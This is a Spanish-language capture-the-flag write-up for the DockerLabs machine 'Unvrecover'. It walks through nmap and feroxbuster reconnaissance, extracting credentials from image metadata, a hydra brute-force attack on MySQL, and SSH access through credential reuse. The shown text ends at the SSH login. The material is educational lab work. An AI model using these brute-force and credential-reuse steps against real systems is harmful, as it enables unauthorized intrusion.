## Introducción

Este documento presenta la resolución completa de la máquina **Unvrecover**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone múltiples servicios: FTP, SSH, HTTP y MySQL. Durante la enumeración web, se extraen metadatos de una imagen que revelan credenciales (`Wilfredor:Wilfredor`). Combinando esto con un usuario identificado en el sitio (`capybara`), se realiza un ataque de fuerza bruta contra MySQL, obteniendo acceso a la base de datos. Allí se encuentra un hash MD5 y un usuario, y mediante reutilización de credenciales se accede al sistema vía SSH como `capybara`.
Una vez dentro, se encuentra un archivo PDF con la contraseña de `root`, censurada visualmente pero legible al hacer zoom, completando la escalada de privilegios.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Unvrecover.zip
sudo bash auto_deploy.sh Unvrecover.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Unvrecover/{content,exploits,nmap,scripts}
cd Unvrecover
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **21/tcp** — FTP
* **22/tcp** — SSH
* **80/tcp** — HTTP
* **3306/tcp** — MySQL

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1776566646/Ports_pdyn9u.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p21,22,80,3306 172.17.0.2
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js -t 100 -C 404
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1776566645/Feroxbuster_yqqbob.png)

Se encuentra el índice que menciona al usuario `capybara`:

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1776566646/Index_uk5okd.png)

### 1.4 Análisis de metadatos

Se analizan las imágenes con `exiftool`:

```bash
exiftool imagen1.jpg
```

![Exiftool](https://res.cloudinary.com/dewqswzke/image/upload/v1776566645/Exiftool_rk7s6f.png)

Se revelan las credenciales: `Wilfredor:Wilfredor`.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Fuerza bruta MySQL

Se combinan los usuarios `capybara` y `Wilfredor` con el diccionario `rockyou.txt`:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1776566646/hydra_nofy0v.png)

### 2.2 Acceso a la base de datos

```bash
mysql -u capybara -h 172.17.0.2 -p --skip-ssl
```

![Databases](https://res.cloudinary.com/dewqswzke/image/upload/v1776566645/Databases_l0rt6b.png)

```sql
SELECT * FROM registraton;
```

![User Database](https://res.cloudinary.com/dewqswzke/image/upload/v1776566719/UserDatabase_oknvu7.png)

### 2.3 Reutilización de credenciales

```bash
ssh capybara@172.17.0.2
```
